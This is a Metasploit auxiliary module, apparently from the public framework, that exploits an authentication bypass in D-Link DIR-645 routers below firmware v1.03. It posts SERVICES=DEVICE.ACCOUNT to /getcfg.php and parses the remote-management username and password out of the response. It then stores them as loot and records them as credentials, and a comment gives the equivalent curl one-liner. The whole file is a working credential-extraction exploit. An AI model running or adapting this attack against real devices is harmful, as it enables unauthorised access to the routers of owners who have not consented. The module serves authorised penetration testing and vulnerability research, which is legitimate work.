##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'D-Link DIR 645 Password Extractor',
      'Description' => %q{
          This module exploits an authentication bypass vulnerability in DIR 645 < v1.03.
        With this vulnerability you are able to extract the password for the remote
        management.
      },
      'References'  =>
        [
          [ 'OSVDB', '90733' ],
          [ 'BID', '58231' ],
          [ 'PACKETSTORM', '120591' ]
        ],
      'Author'      =>
        [
          'Roberto Paleari <roberto[at]greyhats.it>', # Vulnerability discovery
          'Michael Messner <devnull[at]s3cur1ty.de>'	 # Metasploit module
        ],
      'License'     => MSF_LICENSE
    )
  end

  def run

    vprint_status("#{rhost}:#{rport} - Trying to access the configuration of the device")

    #Curl request:
    #curl -d SERVICES=DEVICE.ACCOUNT http://192.168.178.200/getcfg.php | egrep "\<name|password"

    #download configuration
    begin
      res = send_request_cgi({
        'uri' => '/getcfg.php',
        'method' => 'POST',
        'vars_post' =>
          {
            'SERVICES' => 'DEVICE.ACCOUNT'
          }
        })

      return if res.nil?
      return if (res.headers['Server'].nil? or res.headers['Server'] !~ /DIR-645 Ver 1\.0/)
      return if (res.code == 404)

      if res.body =~ /<password>(.*)<\/password>/
        print_good("#{rhost}:#{rport} - credentials successfully extracted")

        #store all details as loot -> there is some usefull stuff in the response
        loot = store_loot("dlink.dir645.config","text/plain",rhost, res.body)
        print_good("#{rhost}:#{rport} - Account details downloaded to: #{loot}")

        res.body.each_line do |line|
          if line =~ /<name>(.*)<\/name>/
            @user = $1
            next
          end
          if line =~ /<password>(.*)<\/password>/
            pass = $1
            vprint_good("user: #{@user}")
            vprint_good("pass: #{pass}")


            connection_details = {
                module_fullname: self.fullname,
                username: @user,
                private_data: pass,
                private_type: :password,
                workspace_id: myworkspace_id,
                proof: line,
                last_attempted_at: DateTime.now, # kept in refactor may not be valid, obtained but do not attempted here
                status: Metasploit::Model::Login::Status::UNTRIED
            }.merge(service_details)
            create_credential_and_login(connection_details)

            report_cred(
              ip: rhost,
              port: rport,
              service_name: 'http',
              user: @user,
              password: pass,
              proof: line
            )
          end
        end
      end
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return
    end


  end
end
